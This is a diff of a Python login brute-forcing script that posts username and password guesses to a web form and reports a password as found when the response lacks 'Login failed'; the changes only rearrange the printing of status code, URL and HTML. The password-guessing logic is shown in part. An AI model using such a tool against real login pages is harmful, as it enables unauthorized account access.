@@ -39,25 +39,17 @@ try:
 
     data = {'username':username, 'password':password, "Login":'submit'}
     send_data_url = requests.post(url, data=data, verify=False)
-    status_code = send_data_url.status_code
-    html = send_data_url.content
-    cprint("HTTP status code: " + status_code, 'green')
     cprint("HTTP status code: ", 'green')
-    cprint(send_data_url.status_code, 'green')
-    cprint("The HTML: ", 'green')
-    print(send_data_url.content)
+    print(send_data_url.status_code)
     cprint("The URL: ", 'green')
     print(send_data_url.url)
-
-
+    cprint("The HTML: ", 'green')
+    print(send_data_url.content)
+   
     if "Login failed" in str(send_data_url.content):
         cprint("[*] Attempting password: %s" % password, 'red')
     else:
         cprint("[*] Password found: %s " % password,'green')
         
-
-        
-        
-
 except:
     cprint("There was an error, please try again..", 'red')
